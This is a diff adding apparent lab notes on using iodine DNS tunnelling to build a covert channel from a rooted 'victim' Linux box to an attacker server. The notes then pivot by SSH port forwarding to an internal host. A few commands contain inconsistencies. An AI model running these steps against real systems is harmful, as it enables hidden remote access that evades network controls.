@@ -5,6 +5,49 @@ You need to purchase a domain, maybe from NameCheap.
 Go to Advanced DNS and add the 'iod' to an NS Record and an A record and put under Host 'testing' and the IP address of the Linux machine built under Linode or other platforms.
 
 go to code.kyro.se/iodine/check-it/ to check the tunnel.
+it should resolve the iod.domain.com to testing.domain.com
+
+git clone the iodine repo to the linux server and install it.
+
+iodined -h
+
+(this will create a new adapter with an IP address)
+./iodined -f 172.16.69.1 ios.domain.com
+(tunnel password)
+
+go to code.kyro.se/iodine/check-it/ to check the tunnel.
+it should resolve the iod.domain.com and it should now get the correct IP address of the Linode server.
+
+You need to root the victim Linux box.
+- in our case the 2 servers will NOT be able to ping each other.
+- on the victim box run the commands to create the adapter and tunnel
+
+iodine -f -P testPassword Attacker_IP iod.domain.com
+(this means that the client with first try to connect to the Attacker_IP address).
+
+(on attacker box)
+ifconfig
+(we should see the new adapter and if we ping the other private IP, we should get a ping reply)
+ping 172.16.69.4
+
+- there's a tunnel between the client/victim and attacker systems!!!!!
+
+
+ssh into the compromised box:
+ssh -L 6969:10.10.10.2:22 root@172.16.69.4
+(success!!!!)
+
+nc -nv 127.0.0.1 6969
+(got the SSH version number)
+
+nmap -sV -Pn -p 22 127.0.0.1 6969
+
+ssh root@127.0.0.1 -p 6969
+
+
+
+
+
 
 
 
